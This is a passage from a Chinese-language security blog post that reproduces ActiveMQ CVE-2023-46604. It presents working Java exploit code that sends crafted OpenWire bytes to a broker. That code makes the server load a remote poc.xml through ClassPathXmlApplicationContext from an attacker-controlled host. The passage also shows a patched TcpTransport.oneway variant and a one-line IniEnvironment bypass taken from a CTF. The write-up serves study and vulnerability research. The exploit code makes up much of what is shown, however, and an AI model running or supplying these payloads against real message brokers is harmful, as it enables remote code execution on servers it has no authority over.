class="line">            <span class="comment">//这里对应OpenWireFormat#doUnmarshal方法，读取下一个字段，用来判断该以何种形式处理接下来的具体数据层，31对应的是ExceptionResponse反序列化类，也就是说我们接下来的具体数据层是在反序列化一个报错类。</span></span><br><span class="line">            <span class="comment">//不过这个反序列化不是标准的反序列化，而是通过全类名forName进行加载之后，再通过实例化构造出。</span></span><br><span class="line">            outputStream.writeByte(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ExceptionResponseMarshaller在调用looseUnmarshal的时候会调用到父类的两次writeInt和writeBoolean</span></span><br><span class="line">            outputStream.writeInt(<span class="number">1</span>);</span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//如果是ConnectionErrorMarshaller线，就把这一个Int去掉，本身调用父类的loose或者tightmarshal只会读取一次int和boolean</span></span><br><span class="line">			outputStream.writeInt(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//为了默认松弛loose反序列化，第一段writeBoolean其实是为了能够进去第一个大if判断，这个必须要，不然无法调用到具体逻辑。</span></span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//outputStream.writeInt(1);</span></span><br><span class="line">            <span class="comment">//第三个writeBoolean是为了clazz能够读取到，也就是我们想要初始化的那个类的全类名，读的时候是readUTF，所以写的时候也是readUTF。这里存在一个问题，我具体会在代码块之后讲解。</span></span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            outputStream.writeUTF(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>);</span><br><span class="line">            <span class="comment">//道理相同，写message</span></span><br><span class="line">            outputStream.writeBoolean(<span class="literal">true</span>);</span><br><span class="line">            outputStream.writeUTF(<span class="string">&quot;http://192.168.86.135:6171/poc.xml&quot;</span>);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            SocketoutputStream.flush();</span><br><span class="line">            SocketoutputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接打，也是没问题</p>
<p><img src="/images/activeMQ/assets/image-20241022171928-12j3wbs.png" alt="image">​</p>
<p>结论就是，小改一个WriteInt就好</p>
<h2 id="openWire协议分析"><a href="#openWire协议分析" class="headerlink" title="openWire协议分析"></a>openWire协议分析</h2><p>这个我是最没花时间的，官方文档写了他就是默认支持tcp协议，所以开个socket然后客户端引入activeMQ的client依赖写生产者或者写dataInput都可以了。</p>
<p>‍</p>
<h2 id="X1新解法"><a href="#X1新解法" class="headerlink" title="X1新解法"></a>X1新解法</h2><p>这个洞当时师傅们还在争着复现的时候,X1师傅应该是比较早发出来的，师傅们后续复现绝大部分思路都是跟着X1师傅走的，这个思路只能说很牛逼，不得不评鉴的一环。</p>
<p>一开始是根据sink找到了ExceptionRepsonseMarshaller类，然后定位到<code>ExceptionResponse</code>​类，从他的getter方法中获取到了它的内存表示为31。这一点就是另一个思考的方式，先看看当前这个sink类是在干什么。</p>
<p>最后就是他如何构造poc的思路，反过来想，既然这个协议我还没分析怎么做，不知道怎么构造协议，那我直接下他的依赖，看看他序列化是怎么进行的，然后调用他这个具体的方法即可。找到了TcpTransport中的oneway方法</p>
<p><img src="/images/activeMQ/assets/image-20241022173206-z7vyyx6.png" alt="image">​</p>
<p>原文如下：</p>
<p><img src="/images/activeMQ/assets/image-20241022173321-iy51qhn.png" alt="image">​</p>
<p>其实它发送数据的形式跟官网的很一样，我一开始也是这么做的，官网文档随便翻找一下：<a target="_blank" rel="noopener" href="https://activemq.apache.org/components/classic/documentation/version-5-hello-world%E3%80%82%E6%AD%A3%E5%A5%BD%E5%9C%A8%E5%A4%8D%E7%8E%B0%E8%BF%99%E4%B8%AA%E6%B4%9E%E4%B9%8B%E5%89%8D%E7%9C%8B%E4%BA%86%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9Ahttps://xz.aliyun.com/t/13778%EF%BC%8C%E5%BE%88%E8%87%AA%E7%84%B6%E7%9A%84%E6%83%B3%E5%88%B0%E6%B6%88%E8%B4%B9%E8%80%85%E7%94%9F%E4%BA%A7%E8%80%85%E4%BB%A5%E5%8F%8Amessage%E7%9A%84%E9%80%BB%E8%BE%91%EF%BC%8C%E6%89%80%E4%BB%A5%E5%9C%A8sink%E7%9A%84%E6%97%B6%E5%80%99%E6%88%91%E6%B2%A1%E4%BB%80%E4%B9%88%E9%99%8C%E7%94%9F%E6%84%9F%E3%80%82">https://activemq.apache.org/components/classic/documentation/version-5-hello-world。正好在复现这个洞之前看了消息队列的相关知识：https://xz.aliyun.com/t/13778，很自然的想到消费者生产者以及message的逻辑，所以在sink的时候我没什么陌生感。</a></p>
<p>所以他的做法就是patch一个同包名下的TcpTransport，重新对应的逻辑，classloader在找类的时候由于Application ClassLoader加载该类的时会先查找当前包下是否存在该类，所以先加载到了它，那么重写就是重写oneway方法,这样就可以借刀杀人，把我们想要的ClassPathXmlApplicationContext给写进去。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">oneway</span><span class="params">(Object command)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkStarted();</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8000/poc.xml&quot;</span>);</span><br><span class="line">    <span class="type">ExceptionResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExceptionResponse</span>(obj);</span><br><span class="line">   <span class="built_in">this</span>.wireFormat.marshal(response, <span class="built_in">this</span>.dataOut);</span><br><span class="line">    <span class="built_in">this</span>.dataOut.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是之后的marshal会通过<code>o.getClass().getName()</code>​获取类名，此时的ClassPathXmlApplicationContext还是它本身这个类型，X1师傅采取方式是patch <code>ClassPathXmlApplicationContext</code>​,继承Throwable类型就好，之后就是交给activeMQ本身的marshal即可，他会把字节写成31的</p>
<p><img src="/images/activeMQ/assets/image-20241022174311-l7q72hc.png" alt="image">​</p>
<p>整体只能说很牛逼，狠狠的学了。</p>
<h2 id="新绕过"><a href="#新绕过" class="headerlink" title="新绕过"></a>新绕过</h2><p>今年WMCTF的时候做到的，当时辛亏还是小叮师傅的帮助下把这道题A出来了，当时其实如果我这么复现过ActivMQ就不会那么坐牢做一天才把他做出来了，整体思路还是一样的。实例化调用方法，传参为字符串形式就能够利用。打的是二次反序列化，出自某年的KCON—Make ActiveMQ Attack Authoritative</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.apache.activemq.shiro.env.IniEnvironment(<span class="string">&quot;&quot;</span>[main]\nactiveMQObjectMessage=org.apache.activemq.command.ActiveMQObjectMessage\nactiveMQObjectMessage.content=\<span class="string">&quot;CCString\&quot;&quot;</span><span class="string">&quot;);</span></span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要写两个东西，感想和以面看待该洞。</p>
<p>首先在复现这个洞之前学了一手消息队列的基础知识，笔记就不放了，我要随时补充，会很乱。了解到如果说像类似于这种MQ形式的中间件如果出问题了，影响到的是整个业务，因为一切调度都要经过这个MQ，所以这类中间件漏洞是很重要和威胁的，然而在此之前要先了解这些中间件都是用来干什么的，基础概念还是要懂，我作为一个经过了很久有充足时间的人去复现这个漏洞，是可以把他基础先看完再来看洞的，所以陌生感少很多。但是真到了漏洞应急或者需要我们挖洞的时候，这些基础都是短时间补不上的，平时还是得多看，书到用时方恨少。</p>
<p>分析复现，以及出poc看sink和source是很快，但是真正去学到东西，除了一步一步写出poc练到的操作和思考，其实还要以面去看这个洞，他实战如何打？怎么绕过，怎么武器化？都是我现在需要去做和练的。</p>
<p>‍</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>stoocea</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://example.com/post/ActiveMQ%20CVE-2023-46604%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">http://example.com/post/ActiveMQ%20CVE-2023-46604%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span></span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Do you believe in <strong>DESTINY</strong>?</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/ActiveMQ/"># ActiveMQ</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/post/CVE-2024-22399%20Seata%20Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">CVE-2024-22399 Seata Hessian反序列化漏洞分析</a>
            
            
            <a class="next" rel="next" href="/post/JDK%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84JNDI%E5%88%A9%E7%94%A8%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E8%A1%A5%E5%85%85.html">JDK高版本下的JNDI利用以及一些补充</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© stoocea | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>